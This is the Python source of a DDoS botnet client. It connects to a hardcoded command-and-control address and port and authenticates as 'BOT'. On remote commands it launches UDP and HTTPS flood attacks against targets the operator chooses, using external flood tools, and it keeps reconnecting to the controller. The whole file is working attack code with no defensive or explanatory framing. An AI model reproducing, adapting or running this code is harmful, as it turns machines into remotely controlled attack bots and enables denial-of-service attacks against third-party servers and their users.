import socket, threading, time, os, sys
from multiprocessing import Process
from typing import Any, List, Set, Tuple
from uuid import UUID, uuid4

KRYPTONC2_ADDRESS  = "103.172.205.120"
KRYPTONC2_PORT  = 5511

def remove_by_value(arr, val):
    return [item for item in arr if item != val]

def attack_udp(ip, port, secs):
    os.system(f"""./udpbypass {ip} {port} {secs} 1472 1024""")

def attack_https(url, port, secs):
    os.system(f"""node raw.js GET {url} {secs} 5 90 --full""")

def main():
        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        while 1:
            try:
                c2.connect((KRYPTONC2_ADDRESS, KRYPTONC2_PORT))
                while 1:
                    c2.send('669787761736865726500'.encode())
                    break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send('BOT'.encode())
                        break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Password' in data:
                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                        break
                break
            except:
                time.sleep(5)
        while 1:
            try:
                data = c2.recv(1024).decode().strip()
                if not data:
                    break
                args = data.split(' ')
                command = args[0].upper()

                if command == '.UDP-FROZEN':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                    print(f"""executing udp-frozen {ip}:{port}""")

                if command == '.HTTPS-FROZEN':
                    url = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threading.Thread(target=attack_https, args=(url, port, secs), daemon=True).start()
                    print(f"""executing https-frozen {ip}:{port}""")

                elif command == 'PING':
                    c2.send('PONG'.encode())

            except:
                break

        c2.close()

        main()

if __name__ == '__main__':
        try:
            main()
        except:
            pass
